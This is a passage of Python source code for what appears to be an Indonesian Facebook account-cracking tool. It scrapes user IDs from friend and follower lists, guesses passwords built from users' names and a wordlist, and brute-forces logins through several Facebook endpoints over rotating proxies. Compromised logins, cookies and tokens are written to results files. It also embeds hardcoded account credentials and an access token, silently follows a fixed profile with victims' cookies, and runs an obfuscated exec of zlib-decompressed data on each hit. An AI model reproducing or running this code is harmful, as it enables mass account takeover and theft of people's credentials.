		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for data in id:
				kiky_gtg.submit(self._lonte_, data, toket, token)
	def _lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
						goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
					except:pass
			url = ("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token)
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
						tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
					except:pass
		except KeyError:pass
		todz = me()
		todz.add_column("ID", style=I, justify="center")
		todz.add_column("JUMLAH TEMAN", style=C, justify="center")
		todz.add_column("JUMLAH PENGIKUT", style=O, justify="center")
		todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
		if "0" == f"{len(goblok)}":
			if "0" == f"{len(tolol)}":pass
			else:
				sol().print(todz, justify='center')
		else:
			sol().print(todz, justify='center')

	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		god_cp,god_ok="",""
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:
				ijo__ = filex.split("results/OK-")[1]
				ijo_ = (QQ+II+"results/OK-"+ijo__)
				god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
			try:
				kuning__ = filex.split("results/CP-")[1]
				kuning_ = (QQ+KK+"results/CP-"+kuning__)
				god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
		iprint(Panel(god_ok, style=I, title="RESULTS OK"))
		iprint(Panel(god_cp, style=K, title="RESULTS CP"))
		print()
	def rek(self):
		self.cekfile_crk("results")
		namax=input(f">--Nama File--> ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA !!", M,Q);time.sleep(3)
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("");Ass = ("%s"%(KK));aSs = KK
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("")
				Ass = ("%s"%(II))
				aSs = II
			except:
				copy_ri = ("DARK-FB")
				Ass = ("%s"%(CC))
				aSs = MM
		kotak(f"# JUMLAH AKUN : {len(fila)}",C,Q)
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					iprint(Panel(f"{QQ}{Ass}{copy_ri}{QQ}{aSs}{user}|{pw}|{tll}{QQ}", style=Q, title="AKUN"))
				except:pass
				time.sleep(0.01)
	def cek_opsi(self):
		cekfile_crk("results")
		print(">--Contoh-->"+k+"results/CP-"+durasi+".txt"+q)
		files = input('>--Nama File-->')
		try:
			buka_baju = open(files,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA",M,Q)
			time.sleep(2);self.cek_opsi()
		with __Kiky__(max_workers=25) as kontok:
			for memek in buka_baju:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
				try:
					kontok.submit(hide_opsi, titid[0], titid[1], titid[2])
				except:
					kontok.submit(hide_opsi, titid[0], titid[1], "")
		kotak("# TEKAN ENTER UNTUK KEMBALI",I,Q)
		input()
		Main_()._no_vpn()
class crack_new:
	def __init__(self):
		_ = "UDAH TAU GW CODING SENDIRI ENGGA DIBANTU, NAK KALIAN RIKOD WKWKWK"
	def Kontol_Kau_Ikuti(self,sessionn,cokii):
		try:
			r = BeautifulSoup(sessionn.get("https://mbasic.facebook.com/profile.php?id=100063690353340",cookies={"cookie":cokii}).text,"html.parser")
			get = r.find("a",string="Ikuti").get("href")
			sessionn.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":cokii}).text
		except:pass
		try:
			puput = {'cookie':cokii}

			with requests.Session() as xyz:
				for x in par(xyz.get('https://mbasic.facebook.com/100063690353340',cookies=puput).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
		except:pass


	def otomatis(self):
		global anim,anim2
		anim = Progress(SpinnerColumn("arrow2"),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		anim2 = anim.add_task('',total=len(idd))
		kotak("# SEBELUM CRACK SILAHKAN JAWAB PERTANYANN DIBAWAH INI",I,Q)
		self.pilih_fps()
		if "fast" == fps:
			self.buat_ugen()
			self.pilih_mentod_()
		else:
			self.tanya_apk()
			self.tanya_opsi()
			self.tanya_prox_k()
			self.buat_ugen()
			self.pilih_url()
			self.pilih_mentod()
		self.pas_me()
		iprint(Panel(f"{OO}JIGA TIDAK ADA HASIL, SILAHKAN HIDUP MATIKAN MODE PESAWAT{QQ}\n{II}RESULTS OK DISIMPAN KE : results/OK-{durasi}.txt\n{KK}RESULTS CP DISIMPAN KE : results/CP-{durasi}.txt{QQ}", style=Q, title="INFORMATION"))
		with anim:
			with __Kiky__(max_workers=35) as kontok:
				for kocok in id:
					try:
						idz = kocok.split('<=>')[0]
						pws = kocok.split('<=>')[1].lower()
						pws_ = kocok.split('<=>')[1]
						colmek = pws.split(' ')[0]
						colmek_ = pws_.split(' ')[0]
						pwe = []
						if len(colmek)<5:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")

								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)

								pwe.append(pws)
								pwe.append(pws_)
						else:
							if len(colmek)<3:
								if pass_ in ["01","1"]:
									pass
								elif pass_ in ["02","2"]:
									pass
								elif pass_ in ["03","3"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")

								elif pass_ in ["04","4"]:
									pwe.append("anjing")
									pwe.append("kontol")
									pwe.append("sayang")
									pwe.append("pantek")
									pwe.append("indonesia")
									pwe.append("sayangku")
									pwe.append("123456")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
							else:
								if pass_ in ["01","1"]:
									pwe.append(colmek+"123")
									pwe.append(colmek+"12345")
								elif pass_ in ["02","2"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["03","3"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["04","4"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
								elif pass_ in ["05","5"]:
									pwe.append(colmek)
									pwe.append(colmek+"123")
									pwe.append(colmek+"1234")
									pwe.append(colmek+"12345")
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								elif pass_ in ["06","6"]:
									for zorro in pass_man.split(","):
										pwe.append(zorro)
								pwe.append(pws_)
								pwe.append(pws)


						if "fast" == fps:
							kontok.submit(self.method_fast, idz, pwe)
						else:
							if "mobile" == url_met:
								kontok.submit(self.method, idz, pwe,"m.facebook.com")
							elif "free" == url_met:
								kontok.submit(self.method, idz, pwe,"free.facebook.com")
							elif "p" == url_met:
								kontok.submit(self.method, idz, pwe,"p.facebook.com")
							elif "x" == url_met:
								kontok.submit(self.method, idz, pwe,"x.facebook.com")
							else:
								kontok.submit(self.method, idz, pwe,"mbasic.facebook.com")
#					except Exception as e:print(e)
					except:
						pass
		print()
		print()
		kotak("# CRACK SELESAI JANGAN LUPA, ISTIRAHAT", I, C)
		os.sys.exit()

	def chexk_ip_spam(self,user,memek,url):
		kata_s = "╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                             JARINGAN ANDA TERKENAK SPAM                              ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝"
		try:
			url="p.facebook.com"
			ua = "Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]"

# Akun dibawah ini harus diganti tiap dipublickan
			user,pw,ttl = ("100043579999566|tasya123|").split("|")
#			user,pw,ttl = ("100050480813279|aura123|—").split("|")
#			user,pw,ttl = ("100035736123088|josgandos|-").split("|")
			session=requests.Session()
			r = BeautifulSoup(session.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
			'Host'	: url,
			'Connection'	:	'keep-alive',
			'Cache-Control'	:	'max-age=0',
			'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile'	:	'?1',
			'sec-ch-ua-platform'	:	'"Android"',
			'Upgrade-Insecure-Requests'	:	'1',
			'User-Agent'	:	'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36',
			'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'Sec-Fetch-Site'	:	'same-origin',
			'Sec-Fetch-Mode'	:	'navigate',
			'Sec-Fetch-User'	:	'?1',
			'Sec-Fetch-Dest'	:	'document',
			'Referer'	:	'https://'+url+'/login/device-based/',
			'Accept-Encoding'	:	'gzip, deflate',
			'Accept-Language'	:	'id-ID,id;q=0.9'
			}).text, 'html.parser')
			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
			data.update({'uid':user,'next':'https://'+url+'/login/save-device/','flow':'login_no_pin','encpass':'#PWD_BROWSER:0:{}:{}'.format(jam_,pw)})
			session.post(f'https://{url}/login/device-based/validate-password/', data=data, headers={'Host'	: url,'Connection'	:	'keep-alive','Content-Length'	:	'142','Cache-Control'	:	'max-age=0','sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile'	:	'?1','sec-ch-ua-platform'	:	'"Android"','Upgrade-Insecure-Requests'	:	'1','Origin'	:	'https://'+url,'Content-Type'	:	'application/x-www-form-urlencoded','User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Sec-Fetch-Site'	:	'same-origin','Sec-Fetch-Mode'	:	'navigate','Sec-Fetch-User'	:	'?1','Sec-Fetch-Dest'	:	'document','Referer'	:	f'https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr','Accept-Encoding'	:	'gzip, deflate, br','Accept-Language'	:	'id-ID,id;q=0.9'})
			if 'c_user' in session.cookies.get_dict():
				anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
				anim.advance(anim2)

			elif 'checkpoint' in session.cookies.get_dict():
				anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
				anim.advance(anim2)
			else:
				anim.update(anim2,description=f"{i}{m2}JARINGAN ANDA TERKENAK SPAM{q}")
				anim.advance(anim2)
				self.method(user, memek,url)
		except:
			anim.update(anim2,description=f"{i}{m2}JARINGAN ANDA TERKENAK SPAM{q}")
			anim.advance(anim2)
			self.method(user, memek,url)

	def method_fast(self, user, memek):
		global ok,cp,loop
		ua = random.choice(ugen_)
		try:
			loop += 1
			for pw in memek:
				pw = pw.lower()
				ses=requests.Session()
				if "ke1" == method:
					param = {'format' : 'json','email' : user,'password' : pw,'locale' : 'id_ID','generate_session_cookies' : '1','access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
					header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
					resp = ses.get('https://b-api.facebook.com/method/auth.login?', params=param, headers=header)
				elif "ke2" == method:
					head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
					resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(user)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
				xo = resp.content
				ttl = "—"
				if "session_key" in str(xo):
					print(ua)
					play_mpv(".Wiii.mp3")
					try:
						kiky=json.loads(resp.text)
						coki= kiky['access_token']
					except:
						coki= "—"
					wrt = '%s|%s|%s' % (user,pw,coki)
					ok.append(wrt)
					open('results/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
					ok_ = Tree("                                 ",highlight=True, hide_root=True)
					ok__= ok_.add(f":bolivia::oman: {o}AKUN OK NI BOZZ{q}",guide_style="uu red")
					ok___ = ok__.add(f"{b}ID DAN PASSWORD{q}")
					ok___.add(f"\r{i}{user}{q}|{i}{pw}{q}")
					ok___ = ok__.add(f"{b}COOKIES{q}")
					ok___.add(f"{c}{coki}{q}")
					prints(ok__)
				elif "www.facebook.com" in str(xo):
					play_mpv(".Wiii.mp3")
					wrt = '%s|%s|%s' % (user,pw,ttl);cp.append(wrt);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]));open('results/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
					cp_ = Tree("                                 ",highlight=True, hide_root=True)
					cp__= cp_.add(f":bolivia::oman: {u}AKUN CP NI BOZZ{q}",guide_style="uu blue")
					cp___ = cp__.add(f"{k}ID DAN PASSWORD{q}")
					cp___.add(f"\r{m}{user}{q}|{m}{pw}{q}")
					cp___ = cp__.add(f"{k}TANGGAL LAHIR{q}")
					cp___.add(f"{m}{ttl}{q}")
					prints(cp__)
				else:continue

			anim.update(anim2,description=f"{b}{loop}{q}/{u}{len(idd)}{q} OK:{i}{len(ok)}{q} CP:{k}{len(cp)}{q}")
			anim.advance(anim2)
		except:
			loop-=1
			self.method_fast(user, memek)
	def method(self, user, memek,url):
		global ok,cp,loop
		try:
			loop += 1
			for pw in memek:
				if "ke1" == method:
#					pw = pw.lower()
					session=requests.Session()
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					ua = random.choice(ugen_)
					proxy= {"http": f"socks5://{random.choice(prox)}"}
					headers1= {
						"Host":url,
						"upgrade-insecure-requests":"1",
						"user-agent":ua,
						"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
						"x-requested-with":"com.facebook.katana",
						"sec-fetch-site":"same-origin",
						"sec-fetch-mode":"cors",
						"sec-fetch-user":"empty",
						"sec-fetch-dest":"document",
						"referer":f"https://{url}/",
						"accept-encoding":"gzip, deflate br",
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
						}
					p = session.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
					data = {
						"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
						"email":user,
						"pass":pw
						}
					headers2 = {
						"Host": url,
						"cache-control":"max-age=0",
						"upgrade-insecure-requests":"1",
						"origin":f"https://{url}",
						"content-type":"application/x-www-form-urlencoded",
						"user-agent":ua,
						"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"x-requested-with":"com.facebook.katana",
						"sec-fetch-site":"same-origin",
						"sec-fetch-mode":"cors",
						"sec-fetch-user":"empty",
						"sec-fetch-dest":"document",
						'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
						"accept-encoding":"gzip, deflate br",
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
						}
					if "Risky_Ganteng" == prox_k:
						po = session.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"+yyy,data=data, headers=headers2, proxies=proxy)
					else:
						po = session.post(f"https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl"+yyy,data=data, headers=headers2)
				elif "ke2" == method:
#					pw = pw.lower()
					ua = random.choice(ugen_)
					session=requests.Session()
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					proxy= {"http": f"socks5://{random.choice(prox)}"}
					headers1= {
						"Host": url,
						"cache-control": "max-age=0",
						"user-agent": ua,
						"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
						"sec-ch-ua-mobile": "?1",
						"sec-fetch-site": "same-origin",
						"sec-fetch-mode": "cors",
						"sec-fetch-dest": "empty",
						"sec-fetch-user": "?1",
						"upgrade-insecure-requests": "1",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
					p = session.get(f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
					data = {
						"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
						"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
						"uid":user,
						"next":f"https://{url}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
						"pass":pw,
						"flow":"login_no_pin"}
					cookie = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					cookie += " m_pixel_ratio=2.625; wd=412x756"
					headers2 = {
						"Host": url,
						"connection": "keep-alive",
						"cache-control": "max-age=0",
						"save-data": "on",
						"origin": "https://m.facebook.com",
						"content-type": "application/x-www-form-urlencoded",
						"user-agent": ua,
						"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
						"x-requested-with": "com.facebook.katana",
						"dnt": "1",
						"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
						"sec-ch-ua-platform": '"Android"',
						"sec-ch-ua-mobile": "?1",
						"sec-fetch-site": "same-origin",
						"sec-fetch-mode": "cors",
						"sec-fetch-dest": "empty",
						"sec-fetch-user": "?1",
						"upgrade-insecure-requests": "1",
						"referer": f"https://{url}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
						"accept-encoding": "gzip, deflate br",
						"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
					if "Risky_Ganteng" == prox_k:
						po = session.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID"+yyy,data=data, headers=headers2, cookies={"cookie": cookie}, proxies=proxy, allow_redirects=False)
					else:
						po = session.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID"+yyy,data=data, headers=headers2, cookies={"cookie": cookie},allow_redirects=False)
				elif "ke3" == method:
#					pw = pw.lower()
					ua,ua2 = random.choice(ugen_),random.choice(ugen__)
					session=requests.Session()
					prox = open("data/prox_socks5.txt","r").read().splitlines()
					proxs= {"http": f"socks5://{random.choice(prox)}"}

					session.headers.update({'Host':url,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1',"user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",'sec-fetch-site': 'same-origin',"sec-fetch-mode":"navigate","sec-fetch-dest":"document","pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","sec-ch-ua-platform": "Android","sec-ch-ua":'" Not A;Brand";v="99", "Chromium";v="101"','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
					p = session.get(f'https://{url}/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
					dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":random.choice(link_app),"flow":"login_no_pin","pass":pw}
					koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
					koki+=' m_pixel_ratio=1.7000000476837158; wd=424x800'
					heade={"authority":url,"method":"GET","path":"/","scheme":"https","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control":"max-age=0","pragma":"akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "Android","sec-ch-ua":'" Not A;Brand";v="99", "Chromium";v="101"',"sec-fetch-dest":"document","sec-fetch-mode":"navigate","sec-fetch-site":"same-origin","sec-fetch-user":"?1","upgrade-insecure-requests": "1","user-agent":ua}
					if "Risky_Ganteng" == prox_k:
